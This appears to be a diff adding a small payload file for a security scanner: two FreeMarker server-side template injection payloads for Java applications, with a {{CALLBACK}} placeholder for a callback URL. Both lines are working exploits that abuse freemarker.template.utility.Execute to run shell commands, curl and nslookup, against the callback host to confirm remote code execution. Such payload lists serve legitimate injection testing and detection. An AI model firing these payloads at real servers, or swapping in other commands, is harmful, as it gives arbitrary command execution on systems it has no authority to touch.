@@ -1,0 +1,4 @@
+# Freemarker SSTI payloads - Java template engine
+# {{CALLBACK}} replaced with callback URL
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl {{CALLBACK}}")}
+${"freemarker.template.utility.Execute"?new()("nslookup {{CALLBACK}}")}
